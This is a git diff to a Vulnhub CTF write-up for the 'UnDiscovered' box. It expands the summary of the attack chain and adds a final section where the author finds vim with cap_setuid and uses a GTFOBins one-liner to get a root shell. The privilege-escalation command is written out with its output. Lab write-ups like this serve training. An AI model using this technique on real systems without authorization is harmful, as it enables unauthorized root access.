@@ -3,7 +3,7 @@ title: Vulnhub - UnDiscovered
 description: My writeup on UnDiscovered box.
 categories:
  - vulnhub
-tags: vulnhub nfs hydra wfuzz ritecms
+tags: vulnhub nfs hydra wfuzz ritecms capabilities ssh
 ---
 
 ![](https://i.imgur.com/mmvSbqs.png)
@@ -12,7 +12,7 @@ You can find the machine there > [UnDiscovered](https://www.vulnhub.com/entry/un
 
 ## Summary
 
-This was one of the best vulnhub box, thanks to [@aniqfakhrul](https://twitter.com/aniqfakhrul){:target="_blank"} & [@h0j3n](https://twitter.com/h0j3n){:target="_blank"} for this awesome box! Let’s pwn it! :sunglasses:
+This was one of the best vulnhub box, thanks to [@aniqfakhrul](https://twitter.com/aniqfakhrul){:target="_blank"} & [@h0j3n](https://twitter.com/h0j3n){:target="_blank"} for this awesome box! We start by enumerating subdomains and bruteforcing RiteCMS this gives us shell as www-data. Then we exploit NFS to get shell as william, after we use a SUID binary to get access a leonard and finally privesc is about capabilities! Let’s pwn it! :sunglasses:
 
 ## Enumeration/Reconnaissance
 
@@ -333,3 +333,30 @@ leonard@undiscovered:~$ whoami;id
 leonard
 uid=1002(leonard) gid=1002(leonard) groups=1002(leonard),3004(developer)
 ```
+
+## Shell as root
+
+Now the final privilege escalation, it's about `capabilities`. Let's scan the file system for files with capabilities using `getcap`:
+
+```
+leonard@undiscovered:~$ getcap -r / 2>/dev/null
+/usr/bin/mtr = cap_net_raw+ep
+/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/vim.basic = cap_setuid+ep
+```
+
+Awesome we can exploit vim, [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#capabilities){:target="_blank"} provide us the answer:
+
+```
+leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+# whoami;id
+root
+uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(developer)
+```
+
+Let's read the flags:
+
+![](https://i.imgur.com/LV2dkr0.png)
+
+Whoa! Crazy box! :fire:
